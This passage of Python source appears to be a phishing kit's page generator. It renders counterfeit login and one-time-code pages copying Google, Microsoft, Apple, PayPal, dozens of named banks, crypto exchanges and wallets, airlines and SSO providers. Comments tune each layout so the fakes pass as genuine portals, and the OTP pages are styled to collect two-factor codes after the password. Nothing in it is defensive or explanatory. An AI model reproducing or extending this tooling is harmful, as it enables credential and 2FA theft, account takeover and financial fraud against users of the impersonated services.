  h1 { font-size:20px;margin:0 0 6px;text-align:center;color:#1c1e21;font-weight:600; }
  .sub { text-align:center;color:#65676b;font-size:14px;margin:0 0 22px; }
  .field { margin-bottom:14px; }
  .field label { display:block;font-size:13px;color:#65676b;margin:0 0 6px;
                 font-weight:500; }
  .field input { width:100%;padding:13px 14px;font-size:15px;border:1px solid #ccd0d5;
                 border-radius:8px;background:#fff;outline:none;box-sizing:border-box;
                 transition:border .15s; }
  .field input:focus { border-color:__BRAND__;box-shadow:0 0 0 2px rgba(0,0,0,.06); }
  .btn { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
         background:__BRAND__;border:0;border-radius:8px;cursor:pointer;margin-top:6px; }
  .btn:hover { filter:brightness(1.06); }
  .row { display:flex;justify-content:space-between;align-items:center;margin:14px 0 4px;
         font-size:13px; }
  .row a { color:__ACCENT__;text-decoration:none; }
  .row label { margin:0;display:flex;gap:6px;align-items:center;color:#65676b; }
  .foot { text-align:center;font-size:12px;color:#8a8d91;margin-top:22px;line-height:1.6; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


def _card_page(slug, name, brand, accent, mark, fields, subtitle, favicon, bg="#f0f2f5"):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    body = (
        '<form class="card" method="POST" action="/">\n'
        f'  <div class="mark">{mark}</div>\n'
        f"  <h1>Log in to {_esc(name)}</h1>\n"
        f'  <p class="sub">{_esc(subtitle)}</p>\n'
        + fields_html + _password("boxed")
        + '  <div class="row"><label><input type="checkbox" name="remember" value="1" '
          "checked> Remember me</label><a href=\"#\">Forgot password?</a></div>\n"
        '  <button class="btn" type="submit">Log in</button>\n'
        + _trailer(slug, f'  <div class="foot">{_esc(name)} is a trademark of its '
                         "respective owner.</div>\n")
        + "</form>\n</body>\n</html>\n"
    )
    return (_head(name, f"Log in to {name}", brand, favicon,
                  extra=f"<style>{_fill(_CARD_CSS, brand=brand, accent=accent, bg=bg)}"
                        "</style>\n</head>\n<body>\n") + body)


# ------------------------------------------------------------------ routing ---
# Explicit archetype per brand for the pages people recognise, then keyword rules for
# the long tail so a vertical (banking, crypto, SSO, webmail) gets the shape it uses.

THEMES = {
    "google": "google", "gmail": "google", "youtube": "google", "googleworkspace": "google",
    "microsoft": "ms", "outlook": "ms", "office": "ms", "office365": "ms", "azure": "ms",
    "entra": "ms", "m365": "ms", "onedrive": "ms", "sharepoint": "ms", "teams": "ms",
    "facebook": "facebook", "messenger": "facebook",
    "instagram": "instagram",
    "apple": "apple", "icloud": "apple", "appleid": "apple",
    "amazon": "amazon", "aws": "amazon", "amazonpay": "amazon",
    "netflix": "dark", "spotify": "dark", "x": "dark", "twitter": "dark",
    "twitch": "dark", "discord": "dark", "steam": "dark", "playstation": "dark",
    "xbox": "dark", "roblox": "dark", "reddit": "dark", "tiktok": "dark",
    "snapchat": "dark", "epicgames": "dark", "riotgames": "dark", "battlenet": "dark",
    "linkedin": "card", "github": "card", "gitlab": "card", "paypal": "card",
    "whatsapp": "card", "telegram": "card", "signal": "card", "zoom": "card",
    "slack": "card", "dropbox": "card", "adobe": "card", "notion": "card",
    "binance": "dark", "coinbase": "dark", "kraken": "dark", "okx": "dark",
    "bybit": "dark", "kucoin": "dark", "metamask": "dark", "phantom": "dark",
    "trustwallet": "dark", "ledger": "dark", "trezor": "dark", "exodus": "dark",
    "okta": "split", "onelogin": "split", "auth0": "split", "pingidentity": "split",
    "jumpcloud": "split", "duo": "split", "cyberark": "split", "sailpoint": "split",
    "stripe": "split", "salesforce": "split", "workday": "split", "servicenow": "split",
}
# Banking and finance brands whose own name does not carry the word: the vertical is
# explicit here so each one gets the net-banking portal layout, not a generic card.
THEMES.update({
    "barclays": "bank",
    "lloyds": "bank",
    "natwest": "bank",
    "hsbcuk": "bank",
    "unicredit": "bank",
    "ing": "bank",
    "nordea": "bank",
    "danskebank": "bank",
    "swedbank": "bank",
    "commbank": "bank",
    "westpac": "bank",
    "anz": "bank",
    "scotiabank": "bank",
    "rbc": "bank",
    "bmo": "bank",
    "cibc": "bank",
    "itau": "bank",
    "bradesco": "bank",
    "nubank": "bank",
    "bancolombia": "bank",
    "dbs": "bank",
    "ocbc": "bank",
    "uob": "bank",
    "maybank": "bank",
    "cimb": "bank",
    "bca": "bank",
    "kbank": "bank",
    "mizuhobank": "bank",
    "smbc": "bank",
    "mufg": "bank",
    "kbstar": "bank",
    "shinhan": "bank",
    "emiratesnbd": "bank",
    "qnb": "bank",
    "alrajhibank": "bank",
    "ziraatbank": "bank",
    "garantibbva": "bank",
    "isbank": "bank",
    "chime": "bank",
    "sofi": "bank",
    "discover": "bank",
    "schwab": "bank",
    "fidelity": "bank",
    "vanguard": "bank",
    "etrade": "bank",
    "ally": "bank",
    "usbank": "bank",
    "pnc": "bank",
    "truist": "bank",
    "regions": "bank",
    "fifththird": "bank",
    "keybank": "bank",
    "robinhood": "bank",
    "webull": "bank",
    "wise": "bank",
    "payoneer": "bank",
    "venmo": "bank",
    "cashapp": "bank",
    "klarna": "bank",
    "affirm": "bank",
    "n26": "bank",
    "revolut": "bank",
    "monzo": "bank",
    "starlingbank": "bank",
})

# Travel and airline portals: the split hero (brand panel beside the form) is the shape
# these sites use, and it reads as a real airline page rather than a plain card.
THEMES.update({
    "emirates": "split",
    "qatarairways": "split",
    "singaporeair": "split",
    "lufthansa": "split",
    "klm": "split",
    "ryanair": "split",
    "easyjet": "split",
    "delta": "split",
    "unitedair": "split",
    "southwestair": "split",
    "jetblue": "split",
    "indigo": "split",
    "airindia": "split",
    "spicejet": "split",
    "vistara": "split",
    "akasaair": "split",
    "booking": "split",
    "agoda": "split",
    "expedia": "split",
    "hotelscom": "split",
    "trivago": "split",
    "kayak": "split",
    "skyscanner": "split",
    "tripadvisor": "split",
    "makemytrip": "split",
    "goibibo": "split",
    "yatra": "split",
    "ixigo": "split",
    "redbus": "split",
    "irctc": "split",
})

# Crypto venues and wallets, and the banks whose own name carries no keyword:
# both verticals were falling through to the light generic card.
THEMES.update({
    "bitstamp": "dark",
    "gemini": "dark",
    "bitget": "dark",
    "mexc": "dark",
    "huobi": "dark",
    "poloniex": "dark",
    "bitpanda": "dark",
    "luno": "dark",
    "cexio": "dark",
    "etoro": "dark",
    "coinomi": "dark",
    "electrum": "dark",
    "safepal": "dark",
    "bitpay": "dark",
    "zerion": "dark",
    "htx": "dark",
    "bitcoincom": "dark",
    "opensea": "dark",
    "rarible": "dark",
    "magiceden": "dark",
    "pancakeswap": "dark",
    "uniswap": "dark",
    "bnpparibas": "bank",
    "societegenerale": "bank",
    "creditagricole": "bank",
    "abnamro": "bank",
    "santander": "bank",
    "bbva": "bank",
    "ubs": "bank",
    "wellsfargo": "bank",
    "capitalone": "bank",
    "morganstanley": "bank",
})


# ordered: the first keyword found in the slug or the name decides the shape
ARCHETYPE_HINTS = (
    ("bank", "bank"), ("creditunion", "bank"), ("building", "bank"), ("savings", "bank"),
    ("sso", "split"), ("identity", "split"), ("idp", "split"), ("federation", "split"),
    ("wallet", "dark"), ("crypto", "dark"), ("exchange", "dark"), ("chain", "dark"),
    ("vpn", "dark"), ("game", "dark"), ("gaming", "dark"), ("stream", "dark"),
)


# the OTP page wears the same skin as the login page it follows
OTP_SKIN = {
    "google":   {"bg": "#fff", "card_bg": "#fff", "text": "#202124", "muted": "#5f6368", "radius": "8px", "heading": "2-Step Verification", "sub": "A code was sent to your phone. Enter it to finish signing in.", "button_label": "Next"},
    "ms":       {"bg": "#f2f2f2", "card_bg": "#fff", "text": "#1b1b1b", "muted": "#616161", "radius": "0px", "heading": "Enter code", "sub": "Enter the code we sent to your phone or email to finish ", "button_label": "Verify"},
    "facebook": {"bg": "#f0f2f5", "card_bg": "#fff", "text": "#1c1e21", "muted": "#65676b", "radius": "8px", "heading": "Enter the code", "sub": "We sent a code to your phone. Enter it to log in.", "button_label": "Continue"},
    "instagram": {"bg": "#fafafa", "card_bg": "#fff", "text": "#262626", "muted": "#8e8e8e", "radius": "8px", "heading": "Enter the confirmation code", "sub": "We sent a code to your phone. Enter it to log in.", "button_label": "Confirm"},
    "apple":    {"bg": "#fff", "card_bg": "#fff", "text": "#1d1d1f", "muted": "#6e6e73", "radius": "12px", "heading": "Two-Factor Authentication", "sub": "Enter the verification code sent to your trusted devices.", "button_label": "Continue"},
    "amazon":   {"bg": "#fff", "card_bg": "#fff", "text": "#111", "muted": "#767676", "radius": "8px", "heading": "Two-Step Verification", "sub": "For your security, enter the OTP we sent to your phone.", "button_label": "Sign in"},
    "dark":     {"bg": "#0b0d12", "card_bg": "#151922", "text": "#fff", "muted": "#9aa7b8", "radius": "12px", "heading": "Enter your code", "sub": "We sent a code to your phone. Enter it to continue.", "button_label": "Verify"},
    "split":    {"bg": "#f7f9fc", "card_bg": "#fff", "text": "#1f2933", "muted": "#616e7c", "radius": "8px", "heading": "Verify your identity", "sub": "Enter the code sent to your registered device.", "button_label": "Verify"},
    "bank":     {"bg": "#eef2f7", "card_bg": "#fff", "text": "#1f2933", "muted": "#616e7c", "radius": "10px", "heading": "Enter OTP", "sub": "A one-time password was sent to your registered mobile number.", "button_label": "Submit"},
    "card":     {"bg": "#f0f2f5", "card_bg": "#fff", "text": "#1c1e21", "muted": "#65676b", "radius": "8px", "heading": "Enter your code", "sub": "We sent a code to your phone and email. Enter it to finish ", "button_label": "Verify"},
}


def archetype_for(slug, name):
    """The layout this brand uses: an explicit entry, else a keyword rule, else a card."""
    if slug in THEMES:
        return THEMES[slug]
    # A slug that had to be renamed to stay unique (binanceex, coinbaseex, krakenex,
    # trustwalletapp) still names its brand, so a theme key that PREFIXES the slug
    # wins. It is a prefix test, not a substring test: "entra" sits inside
    # "c-entra-lbank" and "mf-central", and a substring rule gave two Indian banking
    # portals the Microsoft sign-in page. Keys shorter than four characters are
    # skipped: "x" and "o2" would match half the library.
    for key, archetype in THEMES.items():
        if len(key) >= 4 and slug.startswith(key):
            return archetype
    low = (slug + " " + name).lower()
    for keyword, archetype in ARCHETYPE_HINTS:
        if keyword in low:
            return archetype
    return "card"


def render(slug, name, brand, accent, login_with, otp_label, field_labels, subtitle,
           favicon):
    """(login_html, otp_html) for a brand, following the layout that brand uses."""
    archetype = archetype_for(slug, name)
    mark = brand_mark(slug, name, brand)
    args = (slug, name, brand, mark, field_labels, subtitle, favicon)
    if archetype == "google":
        login = _google_page(*args)
    elif archetype == "ms":
        login = _ms_page(*args)
    elif archetype == "facebook":
        login = _facebook_page(*args)
    elif archetype == "instagram":
        login = _instagram_page(*args)
    elif archetype == "apple":
        login = _apple_page(*args)
    elif archetype == "amazon":
        login = _amazon_page(*args)
    elif archetype == "dark":
        login = _dark_page(*args)
    elif archetype == "split":
        login = _split_page(*args)
    elif archetype == "bank":
        login = _bank_page(*args)
    else:
        login = _card_page(slug, name, brand, accent, mark, field_labels, subtitle, favicon)
    skin = OTP_SKIN[archetype]
    otp = _otp_page(slug, name, brand, mark, otp_label, favicon, **skin)
    return login, otp
